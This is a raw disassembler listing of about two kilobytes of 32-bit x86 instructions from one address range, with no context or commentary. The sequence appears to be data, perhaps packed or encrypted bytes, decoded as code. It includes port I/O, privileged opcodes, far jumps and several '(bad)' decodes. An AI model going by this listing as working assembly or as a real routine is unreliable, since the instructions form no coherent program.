  41b2ba:	sub    esp,eax
  41b2bc:	inc    esi
  41b2bd:	xchg   edi,eax
  41b2be:	in     eax,0x4a
  41b2c0:	xchg   edx,eax
  41b2c1:	pushf  
  41b2c2:	mov    ds:0x55c2a611,eax
  41b2c7:	mov    BYTE PTR [ecx-0x2d0327f7],bh
  41b2cd:	push   edi
  41b2ce:	ins    BYTE PTR es:[edi],dx
  41b2cf:	dec    esi
  41b2d0:	mov    DWORD PTR [esp+ecx*4],0x73a6056f
  41b2d7:	retf   0x742e
  41b2da:	fwait
  41b2db:	es and al,0xf5
  41b2de:	add    eax,0xf19403d3
  41b2e3:	or     DWORD PTR [esi-0x32],eax
  41b2e6:	std    
  41b2e7:	pop    ss
  41b2e8:	add    al,0x6c
  41b2ea:	ss retf 
  41b2ec:	and    dh,BYTE PTR [edx]
  41b2ee:	out    dx,eax
  41b2ef:	imul   ebx,DWORD PTR [ecx],0xb649a38f
  41b2f5:	lods   al,BYTE PTR ds:[esi]
  41b2f6:	add    al,BYTE PTR [ebp-0x5c]
  41b2f9:	leave  
  41b2fa:	pop    edx
  41b2fb:	hlt    
  41b2fc:	js     0x41b34a
  41b2fe:	sub    al,0x1b
  41b300:	data16 scas al,BYTE PTR es:[edi]
  41b302:	les    edi,FWORD PTR [ebp+0x39179197]
  41b308:	push   0x6a
  41b30a:	loopne 0x41b2dd
  41b30c:	jnp    0x41b2ab
  41b30e:	add    eax,0x5f07fb2b
  41b313:	push   cs
  41b314:	sahf   
  41b315:	push   ebp
  41b316:	in     al,0xef
  41b318:	jne    0x41b384
  41b31a:	lds    esp,FWORD PTR [ecx-0x36]
  41b31d:	mov    ch,0xdc
  41b31f:	pop    edx
  41b320:	enter  0x669,0xe3
  41b324:	fwait
  41b325:	lea    eax,[ebp+0xaa0fe42]
  41b32b:	push   ebx
  41b32c:	sbb    al,0x52
  41b32e:	inc    edi
  41b32f:	adc    DWORD PTR [edx-0x13d41992],edx
  41b335:	into   
  41b336:	mov    cl,dl
  41b338:	sub    BYTE PTR [ebx],dh
  41b33a:	inc    edx
  41b33b:	pop    edx
  41b33c:	add    DWORD PTR [eax-0x1b],eax
  41b33f:	cmp    BYTE PTR [eax-0x368b4628],ah
  41b345:	loopne 0x41b361
  41b347:	stc    
  41b348:	mov    edi,0xd6a8b77d
  41b34d:	icebp  
  41b34e:	leave  
  41b34f:	mov    ah,0x1d
  41b351:	xchg   esp,eax
  41b352:	ss gs adc al,0x19
  41b356:	mov    cl,0xc4
  41b358:	add    BYTE PTR [esp+esi*2],ah
  41b35b:	pushf  
  41b35c:	loop   0x41b3db
  41b35e:	je     0x41b37a
  41b360:	cmp    BYTE PTR [ebp+0x5c4e1eaf],dl
  41b366:	and    ch,ah
  41b368:	cmp    DWORD PTR [edx],ebx
  41b36a:	mov    ebx,0x2e6e796a
  41b36f:	sub    DWORD PTR [edi+0x15],edi
  41b372:	retf   0x965f
  41b375:	xchg   DWORD PTR [eax+0x1f],edx
  41b378:	test   DWORD PTR [eax+eax*2+0x5e],ebx
  41b37c:	mov    ah,0x4b
  41b37e:	cmp    al,0x34
  41b380:	pop    eax
  41b381:	loope  0x41b319
  41b383:	into   
  41b384:	pop    ecx
  41b385:	add    dh,0x94
  41b388:	sub    al,0x31
  41b38a:	add    al,0x6a
  41b38c:	ja     0x41b3b5
  41b38e:	std    
  41b38f:	xchg   edx,eax
  41b390:	xor    eax,0xe85290ac
  41b395:	mov    ebx,0x60bee229
  41b39a:	shr    esi,cl
  41b39c:	mov    esp,0x4686ef9f
  41b3a1:	mov    dl,0x12
  41b3a3:	adc    edi,edi
  41b3a5:	mov    DWORD PTR [ebp-0x35],0x59daa0f1
  41b3ac:	loope  0x41b3cf
  41b3ae:	inc    edx
  41b3af:	or     ch,BYTE PTR [ebp-0x1f3db178]
  41b3b5:	test   BYTE PTR [esi+0x16e82229],0xc8
  41b3bc:	pop    ebx
  41b3bd:	mov    al,0x7f
  41b3bf:	mov    edx,0x18508964
  41b3c4:	cmp    eax,0xcf929513
  41b3c9:	ins    BYTE PTR es:[edi],dx
  41b3ca:	inc    ebp
  41b3cb:	sbb    bl,BYTE PTR [esi]
  41b3cd:	jmp    0x2c2b039c
  41b3d2:	add    DWORD PTR [ebx+0x54],eax
  41b3d5:	sub    eax,0xeb3d5f93
  41b3da:	xchg   edi,eax
  41b3db:	or     eax,0x5e1f2a10
  41b3e0:	aaa    
  41b3e1:	mov    al,ds:0xd00cccf5
  41b3e6:	pop    ss
  41b3e7:	mov    ah,0xf0
  41b3e9:	sub    ah,BYTE PTR [ecx+0x651a88b7]
  41b3ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3f0:	test   eax,0xf851c402
  41b3f5:	jl     0x41b44c
  41b3f7:	(bad)  
  41b3f8:	mov    al,ds:0x38aa1876
  41b3fd:	jmp    0x4b093c0c
  41b402:	icebp  
  41b403:	push   esp
  41b404:	mov    dh,0x6a
  41b406:	adc    esp,DWORD PTR [ecx-0x3a07ddcf]
  41b40c:	cmp    edi,DWORD PTR [edi]
  41b40e:	push   es
  41b40f:	nop
  41b410:	out    0x4f,eax
  41b412:	jno    0x41b3fa
  41b414:	popf   
  41b415:	mov    ds:0x10441a54,eax
  41b41a:	xor    eax,0x1407adf2
  41b41f:	mov    cl,0xf9
  41b421:	jae    0x41b3fe
  41b423:	shr    DWORD PTR [ebx],0x65
  41b426:	mov    ebx,ecx
  41b428:	jl     0x41b46b
  41b42a:	xchg   edi,eax
  41b42b:	mov    esp,0x5fea7c31
  41b430:	xlat   BYTE PTR ds:[ebx]
  41b431:	stos   DWORD PTR es:[edi],eax
  41b432:	sbb    dl,BYTE PTR [edx-0x11]
  41b435:	or     BYTE PTR [edi+0x18],ah
  41b438:	jno    0x41b47e
  41b43a:	jno    0x41b3fd
  41b43c:	pop    esp
  41b43d:	repz in al,0x3f
  41b440:	sti    
  41b441:	mov    eax,ds:0xb3484e4c
  41b446:	sub    DWORD PTR [ebp+ebp*2+0x22],0xffffffa3
  41b44b:	xor    BYTE PTR [eax-0x53d45eea],ah
  41b451:	jmp    0x3e6f25b2
  41b456:	ja     0x41b4d7
  41b458:	pop    ebp
  41b459:	lods   al,BYTE PTR ds:[esi]
  41b45a:	mov    ecx,0xdcbce735
  41b45f:	pop    esp
  41b460:	jne    0x41b460
  41b462:	scas   al,BYTE PTR es:[edi]
  41b463:	repz sbb eax,0xbf2b0472
  41b469:	sbb    BYTE PTR [edi+0x6808de99],dh
  41b46f:	(bad)  
  41b470:	fdivrp st(6),st
  41b472:	push   0x3bfb5a27
  41b477:	jmp    0x41b407
  41b479:	pop    eax
  41b47a:	jbe    0x41b479
  41b47c:	stos   DWORD PTR es:[edi],eax
  41b47d:	sar    BYTE PTR [edx],1
  41b47f:	push   ecx
  41b480:	out    0xef,eax
  41b482:	(bad)  
  41b483:	dec    edx
  41b484:	push   esp
  41b485:	mov    esi,0x1457f280
  41b48a:	ror    BYTE PTR [ecx+0x4dfa91bd],1
  41b490:	adc    eax,0x1fa2d237
  41b495:	xor    bl,cl
  41b497:	sbb    DWORD PTR [ebx+0x42fda85d],eax
  41b49d:	xchg   esi,eax
  41b49e:	scas   al,BYTE PTR es:[edi]
  41b49f:	mov    esi,0x1d8cc3a
  41b4a4:	scas   al,BYTE PTR es:[edi]
  41b4a5:	adc    DWORD PTR [edi+0x6d],edi
  41b4a8:	leave  
  41b4a9:	cmp    al,0x38
  41b4ab:	leave  
  41b4ac:	je     0x41b4eb
  41b4ae:	sbb    al,0xa5
  41b4b0:	dec    edi
  41b4b1:	push   ss
  41b4b2:	mov    al,0x74
  41b4b4:	scas   al,BYTE PTR es:[edi]
  41b4b5:	push   cs
  41b4b6:	cwde   
  41b4b7:	jl     0x41b503
  41b4b9:	xor    al,0x59
  41b4bb:	out    0x42,al
  41b4bd:	mov    ecx,0x1c6c9b3c
  41b4c2:	call   0x4716e5bd
  41b4c7:	pop    edx
  41b4c8:	sahf   
  41b4c9:	jge    0x41b4d2
  41b4cb:	rcr    DWORD PTR [ecx],1
  41b4cd:	xchg   ebx,eax
  41b4ce:	(bad)  
  41b4cf:	mov    ds:0x47fdd24b,al
  41b4d4:	add    al,0x39
  41b4d6:	cmp    ebp,DWORD PTR [esi-0x1c700058]
  41b4dc:	sar    ebx,0xc7
  41b4df:	pop    edx
  41b4e0:	fs cmp al,0x48
  41b4e3:	lds    ebp,FWORD PTR [ebp+0x73]
  41b4e6:	ret    
  41b4e7:	mov    esi,0x8bb6105d
  41b4ec:	dec    edx
  41b4ed:	lock shl DWORD PTR [esp+esi*1],0x82
  41b4f2:	adc    BYTE PTR [edi+0x52269eca],0x6f
  41b4f9:	sub    ecx,DWORD PTR [esi-0x29]
  41b4fc:	in     eax,0xb2
  41b4fe:	and    DWORD PTR [esi+0x1b],edi
  41b501:	stos   BYTE PTR es:[edi],al
  41b502:	cwde   
  41b503:	enter  0x3e0c,0xe7
  41b507:	test   eax,0x4e64b40a
  41b50c:	mov    WORD PTR [edi-0x518c0a94],ss
  41b512:	jl     0x41b4c3
  41b514:	test   al,0x5d
  41b516:	dec    edi
  41b517:	sbb    BYTE PTR [ecx+edx*4],al
  41b51a:	fstp   DWORD PTR [edi+0x1a]
  41b51d:	scas   al,BYTE PTR es:[edi]
  41b51e:	jmp    0xd3a2:0xb40c76c
  41b525:	bound  esi,QWORD PTR [eax+0x4790743a]
  41b52b:	lea    ecx,[edx-0x44d50ac5]
  41b531:	test   BYTE PTR [ebx],0xc9
  41b534:	pop    esi
  41b535:	inc    esi
  41b536:	ja     0x41b505
  41b538:	push   0xffffffa7
  41b53a:	lods   al,BYTE PTR ds:[esi]
  41b53b:	adc    dh,ch
  41b53d:	ror    BYTE PTR [ecx-0x75],1
  41b540:	add    eax,0xd53f3d5
  41b545:	in     al,dx
  41b546:	jg     0x41b527
  41b548:	xor    BYTE PTR [edi],ah
  41b54a:	std    
  41b54b:	scas   al,BYTE PTR es:[edi]
  41b54c:	int3   
  41b54d:	push   es
  41b54e:	aad    0x8d
  41b550:	icebp  
  41b551:	push   esi
  41b552:	mov    eax,0x11599a14
  41b557:	jle    0x41b55c
  41b559:	push   0xffffff8b
  41b55b:	mov    esp,DWORD PTR [esi+0x2112d16a]
  41b561:	clc    
  41b562:	inc    ebx
  41b563:	sub    DWORD PTR [edi],0x2c8e4bf1
  41b569:	imul   ebp,DWORD PTR [ecx+0x1859156a],0x28
  41b570:	fcom   DWORD PTR [esi-0x12]
  41b573:	jge    0x41b5ba
  41b575:	xchg   edi,eax
  41b576:	mov    al,0xfc
  41b578:	outs   dx,BYTE PTR ds:[esi]
  41b579:	push   cs
  41b57a:	jbe    0x41b5dc
  41b57c:	push   ebx
  41b57d:	sti    
  41b57e:	imul   ecx,DWORD PTR [edx-0x71],0xffffff9e
  41b582:	imul   esi,DWORD PTR [esi+0x6d],0x3cfaa463
  41b589:	mov    dh,0xfc
  41b58b:	in     eax,0x34
  41b58d:	bound  edi,QWORD PTR [edx+0x141d795e]
  41b593:	push   0x89ec11b5
  41b598:	xlat   BYTE PTR ds:[ebx]
  41b599:	outs   dx,DWORD PTR ds:[esi]
  41b59a:	sub    al,0xd9
  41b59c:	xchg   edx,eax
  41b59d:	leave  
  41b59e:	iret   
  41b59f:	leavew 
  41b5a1:	out    0x64,eax
  41b5a3:	add    eax,0x2dba43e2
  41b5a8:	xor    al,0x1d
  41b5aa:	daa    
  41b5ab:	and    al,0xe8
  41b5ad:	xor    DWORD PTR [ebp+0x67],0x734d8fb
  41b5b4:	mov    ah,0x6f
  41b5b6:	test   BYTE PTR [eax-0x5b169b4e],0x38
  41b5bd:	xlat   BYTE PTR ds:[ebx]
  41b5be:	inc    edi
  41b5bf:	mov    dh,0x46
  41b5c1:	mov    cl,0xb9
  41b5c3:	aaa    
  41b5c4:	outs   dx,BYTE PTR ds:[esi]
  41b5c5:	or     eax,0x785f8e47
  41b5ca:	pop    ss
  41b5cb:	jecxz  0x41b56d
  41b5cd:	aaa    
  41b5ce:	push   edx
  41b5cf:	fdecstp 
  41b5d1:	or     al,0xcb
  41b5d3:	std    
  41b5d4:	pop    esp
  41b5d5:	ds xor eax,0x9199cb08
  41b5db:	stc    
  41b5dc:	pminub mm7,QWORD PTR [ecx]
  41b5df:	and    al,0xc6
  41b5e1:	mov    dh,0x1f
  41b5e3:	sbb    DWORD PTR [ebp+0x78],edi
  41b5e6:	cmp    DWORD PTR [esp+esi*1-0x212129f3],ecx
  41b5ed:	retf   0x7f1b
  41b5f0:	and    DWORD PTR [ebp+0xb],ecx
  41b5f3:	xlat   BYTE PTR ds:[ebx]
  41b5f4:	mov    ah,0xbf
  41b5f6:	out    dx,eax
  41b5f7:	mov    bl,0xe7
  41b5f9:	cmp    DWORD PTR [ebp+0x2b],esi
  41b5fc:	out    0x8,eax
  41b5fe:	ins    BYTE PTR es:[edi],dx
  41b5ff:	popa   
  41b600:	sahf   
  41b601:	icebp  
  41b602:	les    ebp,FWORD PTR [edi+0x77]
  41b605:	das    
  41b606:	loope  0x41b5eb
  41b608:	data16 sti 
  41b60a:	adc    eax,0x7e63645c
  41b60f:	fmul   DWORD PTR [edi-0x6]
  41b612:	push   0x72b2cf1
  41b617:	dec    ecx
  41b618:	fstp   st(2)
  41b61a:	xor    dh,dh
  41b61c:	mov    cl,0x60
  41b61e:	pop    eax
  41b61f:	xor    DWORD PTR [esi],edx
  41b621:	xchg   esp,eax
  41b622:	cli    
  41b623:	(bad)  
  41b624:	mov    dh,0x25
  41b626:	xor    dl,bl
  41b628:	clc    
  41b629:	push   0xffffff98
  41b62b:	xor    eax,0x571d1036
  41b630:	nop
  41b631:	dec    ecx
  41b632:	js     0x41b62e
  41b634:	cmp    al,0x30
  41b636:	add    al,0x3f
  41b638:	ins    BYTE PTR es:[edi],dx
  41b639:	ret    
  41b63a:	and    ecx,ecx
  41b63c:	inc    esi
  41b63d:	les    eax,FWORD PTR [ebp-0x54]
  41b640:	add    BYTE PTR [eax+0x45],bh
  41b643:	cmp    eax,0xf2733613
  41b648:	pop    ds
  41b649:	arpl   WORD PTR [esi-0x2c9530d2],bx
  41b64f:	jns    0x41b650
  41b651:	and    al,0x9b
  41b653:	xor    eax,0xf938ac6f
  41b658:	inc    ebp
  41b659:	dec    eax
  41b65a:	mov    ds:0xb46ef1a9,al
  41b65f:	mov    cl,0xf5
  41b661:	dec    esp
  41b662:	fcmovnb st,st(0)
  41b664:	mov    DWORD PTR [edi+0x1],edi
  41b667:	push   ss
  41b668:	mov    esi,esi
  41b66a:	outs   dx,BYTE PTR ds:[esi]
  41b66b:	rcr    DWORD PTR ds:0x78a53864,cl
  41b671:	inc    ebp
  41b672:	xlat   BYTE PTR ds:[ebx]
  41b673:	fdivp  st(4),st
  41b675:	mov    al,0x9
  41b677:	dec    ecx
  41b678:	xchg   dh,cl
  41b67a:	inc    edx
  41b67b:	xor    BYTE PTR [ecx-0x4],al
  41b67e:	sub    dh,0xd4
  41b681:	xchg   esp,eax
  41b682:	lock scas al,BYTE PTR es:[edi]
  41b684:	push   edx
  41b685:	push   0x30
  41b687:	mov    bh,0x5a
  41b689:	imul   ebp,DWORD PTR [eax-0x21],0xb56bb48c
  41b690:	add    al,0x78
  41b693:	mov    bh,0x45
  41b695:	ficomp WORD PTR [edi]
  41b697:	sub    eax,0x5a36c1f7
  41b69c:	adc    al,0xea
  41b69e:	pop    ss
  41b69f:	xor    bh,al
  41b6a1:	ss pop es
  41b6a3:	inc    dh
  41b6a5:	ja     0x41b6c8
  41b6a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6a8:	stos   DWORD PTR es:[edi],eax
  41b6a9:	js     0x41b69c
  41b6ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6ac:	mov    ch,ah
  41b6ae:	xchg   ecx,eax
  41b6af:	pop    ebp
  41b6b0:	mov    esi,0xcdc9a141
  41b6b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6b6:	mov    ebx,0x66a8bacb
  41b6bb:	stos   BYTE PTR es:[edi],al
  41b6bc:	clc    
  41b6bd:	dec    ebx
  41b6be:	jnp    0x41b667
  41b6c0:	inc    ebp
  41b6c1:	neg    DWORD PTR [esi]
  41b6c3:	sub    edi,esp
  41b6c5:	jecxz  0x41b670
  41b6c7:	and    dl,ah
  41b6c9:	xchg   ecx,eax
  41b6ca:	inc    ecx
  41b6cb:	ret    
  41b6cc:	jl     0x41b70d
  41b6ce:	xlat   BYTE PTR ds:[ebx]
  41b6cf:	xchg   esp,eax
  41b6d0:	neg    ecx
  41b6d2:	(bad)  
  41b6d4:	mov    ecx,DWORD PTR [ebx-0x7cb09978]
  41b6da:	inc    edi
  41b6db:	or     ch,BYTE PTR [edx-0x49]
  41b6de:	jle    0x41b696
  41b6e0:	jbe    0x41b75a
  41b6e2:	push   0xffffffc1
  41b6e4:	mov    ebx,0x64bd5b67
  41b6e9:	daa    
  41b6ea:	sbb    ch,BYTE PTR [esi-0x219d20eb]
  41b6f0:	sbb    al,0x5c
  41b6f2:	cmp    BYTE PTR [edx],0x23
  41b6f5:	pop    ebp
  41b6f6:	test   al,0x43
  41b6f8:	sub    bl,BYTE PTR [ebp-0x5c]
  41b6fb:	mov    DWORD PTR [ecx],0x9e4aba70
  41b701:	addr16 mov esp,0xca25c5b2
  41b707:	cs mov ?,ecx
  41b70a:	pop    edx
  41b70b:	loop   0x41b734
  41b70d:	fisub  DWORD PTR [ecx]
  41b70f:	push   edx
  41b710:	jge    0x41b70f
  41b712:	(bad)  
  41b714:	test   ebp,0x36d76709
  41b71a:	cmc    
  41b71b:	ins    DWORD PTR es:[edi],dx
  41b71c:	test   al,0x57
  41b71e:	mov    WORD PTR [ebx+ecx*2-0x7e],?
  41b722:	push   edx
  41b723:	or     eax,0xb6977245
  41b728:	stos   BYTE PTR es:[edi],al
  41b729:	(bad)  
  41b72a:	ficomp WORD PTR [eax+0x11]
  41b72d:	inc    esp
  41b72e:	sahf   
  41b72f:	imul   edi,esi,0xbca23892
  41b735:	pop    esp
  41b736:	ret    0x6b54
  41b739:	jo     0x41b74a
  41b73b:	sbb    ecx,DWORD PTR [eax]
  41b73d:	push   ebx
  41b73e:	imul   eax,DWORD PTR [ecx],0x6b20f0e8
  41b744:	sub    BYTE PTR [eax+eiz*4-0x62],0x9a
  41b749:	inc    ecx
  41b74a:	sub    eax,0x68941fd8
  41b74f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b750:	pushf  
  41b751:	aam    0x94
  41b753:	lods   al,BYTE PTR ds:[esi]
  41b754:	xor    BYTE PTR [ebp+ebp*8-0xd4a5968],bl
  41b75b:	sbb    al,BYTE PTR [ebx]
  41b75d:	push   eax
  41b75e:	imul   ebx,edi,0x20e74385
  41b764:	and    al,0x9e
  41b766:	xor    al,0x63
  41b768:	or     ebx,esi
  41b76a:	out    dx,eax
  41b76b:	inc    ecx
  41b76c:	and    al,0xea
  41b76e:	jle    0x41b7bc
  41b770:	xlat   BYTE PTR ds:[ebx]
  41b771:	enter  0xe95c,0xbd
  41b775:	mov    edx,0x20129dc9
  41b77a:	and    ecx,esp
  41b77c:	jb     0x41b7f9
  41b77e:	or     BYTE PTR [edi],ah
  41b780:	and    al,0xba
  41b782:	pop    ebp
  41b783:	out    0x1f,al
  41b785:	pop    edi
  41b786:	mov    ecx,0x9b7e9f8d
  41b78b:	xchg   esi,eax
  41b78c:	lds    edi,FWORD PTR [ecx+0x31dff065]
  41b792:	int3   
  41b793:	call   0x7278:0xb350d977
  41b79a:	js     0x41b7e5
  41b79c:	push   ecx
  41b79d:	mov    esp,0xb3cb5c1e
  41b7a2:	sti    
  41b7a3:	cs pusha 
  41b7a5:	jne    0x41b81b
  41b7a7:	xor    al,0xda
  41b7a9:	xchg   edx,eax
  41b7aa:	sbb    dh,ah
  41b7ac:	adc    al,bh
  41b7ae:	mov    eax,0x7abf6bbd
  41b7b3:	cdq    
  41b7b4:	mov    cl,0x82
  41b7b6:	jno    0x41b81c
  41b7b8:	scas   eax,DWORD PTR es:[edi]
  41b7b9:	push   esp
  41b7ba:	sti    
  41b7bb:	push   es
  41b7bc:	ins    DWORD PTR es:[edi],dx
  41b7bd:	(bad)  
  41b7bf:	iret   
  41b7c0:	(bad)  
  41b7c1:	fst    st(3)
  41b7c3:	mov    DWORD PTR [esi],esp
  41b7c5:	cmp    al,0x19
  41b7c7:	mov    eax,ds:0x2bc9561f
  41b7cc:	xchg   ebx,eax
  41b7cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7ce:	and    BYTE PTR [edi],cl
  41b7d0:	retf   
  41b7d1:	push   ebx
  41b7d2:	push   ebx
  41b7d3:	(bad)  
  41b7d4:	mov    ebx,0x713f0cb5
  41b7d9:	retf   0x5ba8
  41b7dc:	pop    ebp
  41b7dd:	(bad)  
  41b7de:	ds es loope 0x41b861
  41b7e2:	push   DWORD PTR [eax+edx*8]
  41b7e5:	mov    ch,0x40
  41b7e7:	lds    eax,FWORD PTR [edx+0x32de666c]
  41b7ed:	iret   
  41b7ee:	retf   0x40aa
  41b7f1:	ret    0xe76a
  41b7f4:	in     eax,0x29
  41b7f6:	and    al,0x5d
  41b7f8:	aam    0x63
  41b7fa:	xchg   ecx,eax
  41b7fb:	cld    
  41b7fc:	lea    esi,[ebp+0x63]
  41b7ff:	shl    BYTE PTR [ebp+edi*4-0x21],1
  41b803:	popf   
  41b804:	out    dx,al
  41b805:	loope  0x41b7e0
  41b807:	jnp    0x41b860
  41b809:	dec    edi
  41b80a:	or     DWORD PTR [edi],0x56c9a397
  41b810:	adc    ebp,ecx
  41b812:	push   edx
  41b813:	sahf   
  41b814:	add    DWORD PTR [eax+0x0],esi
  41b817:	and    cl,dl
  41b819:	(bad)  
  41b81a:	pop    edi
  41b81b:	pop    eax
  41b81c:	jno    0x41b84c
  41b81e:	aas    
  41b81f:	cmp    al,0xaa
  41b821:	repnz popa 
  41b823:	pop    ecx
  41b824:	pusha  
  41b825:	scas   eax,DWORD PTR es:[edi]
  41b826:	cdq    
  41b827:	sub    bl,BYTE PTR [eax+0x7b]
  41b82a:	popf   
  41b82b:	loopne 0x41b895
  41b82d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b82e:	lds    edi,FWORD PTR ds:0x4d18ff79
  41b834:	cwde   
  41b835:	fsub   DWORD PTR [ecx-0x6cc5bedc]
  41b83b:	pop    ss
  41b83c:	sub    al,0x5a
  41b83e:	xor    BYTE PTR [ebx+0x43],0x87
  41b842:	or     ecx,edx
  41b844:	repz imul esi,DWORD PTR [edx-0x2def506c],0xa6df36b5
  41b84f:	cdq    
  41b850:	mov    BYTE PTR [esi],ch
  41b852:	cmp    BYTE PTR [eax+0x476edd06],bl
  41b858:	xchg   esi,eax
  41b859:	rcl    dh,0x48
  41b85c:	mov    dl,cl
  41b85e:	bound  ecx,QWORD PTR [edi-0x31]
  41b861:	add    bl,bl
  41b863:	cmp    al,0x9f
  41b865:	hlt    
  41b866:	push   ss
  41b867:	mov    bl,0xdf
  41b869:	jae    0x41b8be
  41b86b:	stc    
  41b86c:	push   edi
  41b86d:	sahf   
  41b86e:	sbb    al,BYTE PTR [eax+eiz*2+0x63]
  41b872:	mov    eax,ds:0xde651c09
  41b877:	ret    0x63dc
  41b87a:	in     eax,dx
  41b87b:	outs   dx,DWORD PTR ds:[si]
  41b87d:	enter  0x2a24,0xa3
  41b881:	mov    ah,0x20
  41b883:	js     0x41b872
  41b885:	mov    BYTE PTR [edi+edx*1-0x6e],0x45
  41b88a:	cmp    al,0x1d
  41b88c:	add    al,0x86
  41b88e:	sub    eax,0xf76be275
  41b893:	test   eax,0x72c4ed47
  41b898:	std    
  41b899:	ror    DWORD PTR [ecx],cl
  41b89b:	fisubr DWORD PTR ds:0xa1be3ea6
  41b8a1:	loop   0x41b8aa
  41b8a3:	aaa    
  41b8a4:	mov    ss,WORD PTR [esi]
  41b8a6:	addr16 add al,0x46
  41b8a9:	fs inc edx
  41b8ab:	or     al,0x42
  41b8ad:	sub    esi,DWORD PTR [edx]
  41b8af:	fs jb  0x41b882
  41b8b2:	jmp    0x41b837
  41b8b4:	retf   0x8ec
  41b8b7:	(bad)  
  41b8b9:	jg     0x41b8ed
  41b8bb:	fcomp  DWORD PTR [eax+0x6a7e6a28]
  41b8c1:	push   ds
  41b8c2:	xchg   edi,eax
  41b8c3:	enter  0xe800,0x1f
  41b8c7:	sbb    eax,0xc0634414
  41b8cc:	xchg   edi,eax
  41b8cd:	sub    cl,dl
  41b8cf:	pop    ebx
  41b8d0:	cmp    ecx,edx
  41b8d2:	push   ecx
  41b8d3:	ins    BYTE PTR es:[edi],dx
  41b8d4:	dec    ebp
  41b8d5:	dec    ecx
  41b8d6:	dec    eax
  41b8d7:	cmp    eax,0x9a6423c7
  41b8dc:	jl     0x41b8dd
  41b8de:	jle    0x41b915
  41b8e0:	shl    BYTE PTR [edx-0xb2c962a],0x36
  41b8e7:	ds pop esp
  41b8e9:	cmc    
  41b8ea:	leave  
  41b8eb:	data16 addr16 add al,0x3
  41b8ef:	mov    es,WORD PTR ds:0x53379e02
  41b8f5:	dec    edx
  41b8f6:	sbb    ecx,DWORD PTR [edx+0x3d]
  41b8f9:	mov    BYTE PTR [esi-0x25],ch
  41b8fc:	pop    edi
  41b8fd:	stos   BYTE PTR es:[edi],al
  41b8fe:	adc    BYTE PTR [eax-0x12],dl
  41b901:	adc    dh,dh
  41b903:	mov    ecx,0xbd8f1694
  41b908:	test   BYTE PTR [ecx+eax*1],0x8a
  41b90c:	lods   al,BYTE PTR ds:[esi]
  41b90d:	mov    al,0xc1
  41b90f:	and    cl,bl
  41b911:	call   0x45d78408
  41b916:	in     eax,dx
  41b917:	mov    DWORD PTR [esp+edi*2-0x30],eax
  41b91b:	and    al,0x81
  41b91d:	push   ebx
  41b91e:	xchg   edx,eax
  41b91f:	out    0x6d,eax
  41b921:	jp     0x41b953
  41b923:	push   0xfffffff6
  41b925:	neg    al
  41b927:	lods   al,BYTE PTR ds:[esi]
  41b928:	jmp    0x41b8f2
  41b92a:	mov    BYTE PTR [eax],dl
  41b92c:	push   ebp
  41b92d:	in     al,dx
  41b92e:	adc    esp,esp
  41b930:	mov    al,ds:0xb227a535
  41b935:	in     al,dx
  41b936:	ret    
  41b937:	push   esi
  41b938:	add    eax,edi
  41b93a:	in     al,0xca
  41b93c:	dec    ebp
  41b93d:	xor    bl,BYTE PTR [esi+0x62]
  41b940:	dec    esp
  41b941:	and    BYTE PTR [ebx+0x4f8d95db],bh
  41b947:	mov    esp,0x188d1f8f
  41b94c:	jecxz  0x41b990
  41b94e:	in     eax,dx
  41b94f:	stos   BYTE PTR es:[edi],al
  41b950:	add    edi,eax
  41b952:	xchg   BYTE PTR [eax+0x1e50b53e],cl
  41b958:	jns    0x41b8f6
  41b95a:	mov    ebp,ecx
  41b95c:	mul    BYTE PTR [ebp+0x54]
  41b95f:	xchg   ebx,eax
  41b960:	adc    DWORD PTR [eax+0x4b],edx
  41b963:	inc    edi
  41b964:	out    dx,al
  41b965:	fwait
  41b966:	ret    
  41b967:	(bad)  
  41b968:	fcomp  DWORD PTR [edi]
  41b96a:	shl    DWORD PTR [ecx-0x556029af],1
  41b970:	shl    BYTE PTR [ebx],0x55
  41b973:	mov    es,WORD PTR [edi+0x53]
  41b976:	fld    QWORD PTR [ebp+0x71]
  41b979:	xchg   ecx,eax
  41b97a:	aam    0x84
  41b97c:	in     eax,dx
  41b97d:	mov    ch,0xe0
  41b97f:	add    cl,BYTE PTR [esi-0x615dcc95]
  41b985:	and    al,0xe7
  41b987:	in     al,0xf0
  41b989:	imul   eax,ecx,0x343d46d4
  41b98f:	ds loop 0x41b9b7
  41b992:	rol    DWORD PTR [edi],1
  41b994:	adc    ebx,edi
  41b996:	jmp    0xd505:0xe5dc3434
  41b99d:	jbe    0x41b99b
  41b99f:	add    DWORD PTR [edx+edi*1],ebx
  41b9a2:	ss adc al,0x9f
  41b9a5:	in     eax,dx
  41b9a6:	and    edx,edx
  41b9a8:	sub    ebp,edx
  41b9aa:	jmp    0x41b99b
  41b9ac:	scas   eax,DWORD PTR es:[di]
  41b9ae:	xlat   BYTE PTR ds:[ebx]
  41b9af:	sbb    eax,0xdb0dd8f0
  41b9b4:	or     BYTE PTR [ecx+0x3c8ecfd4],ah
  41b9ba:	push   ecx
  41b9bb:	popf   
  41b9bc:	push   edx
  41b9bd:	xor    eax,0x39f71820
  41b9c2:	push   ss
  41b9c3:	push   edi
  41b9c4:	bound  esp,QWORD PTR ds:0x3d1739ef
  41b9ca:	pop    edi
  41b9cb:	cmp    esi,esi
  41b9cd:	fbld   TBYTE PTR [ecx+0x1]
  41b9d0:	add    bl,bh
  41b9d2:	mov    ds:0xac0ff614,al
  41b9d7:	mov    DWORD PTR [edi-0x62b223b4],esp
  41b9dd:	jg     0x41b9fe
  41b9df:	jmp    0x41ba30
  41b9e1:	xchg   esp,eax
  41b9e2:	es mov dl,0x96
  41b9e5:	cmp    cl,al
  41b9e7:	mov    ch,0xdd
  41b9e9:	pop    ebp
  41b9ea:	sub    ebx,DWORD PTR [ebp+0x47]
  41b9ed:	cmp    eax,esi
  41b9ef:	push   ebx
  41b9f0:	inc    eax
  41b9f1:	rol    DWORD PTR [esi+0x1af0f0ef],1
  41b9f7:	out    0xe6,al
  41b9f9:	neg    DWORD PTR [edx]
  41b9fb:	push   esi
  41b9fc:	in     al,dx
  41b9fd:	inc    edi
  41b9fe:	int3   
  41b9ff:	inc    edx
  41ba00:	pop    ecx
  41ba01:	ja     0x41ba40
  41ba03:	pop    ds
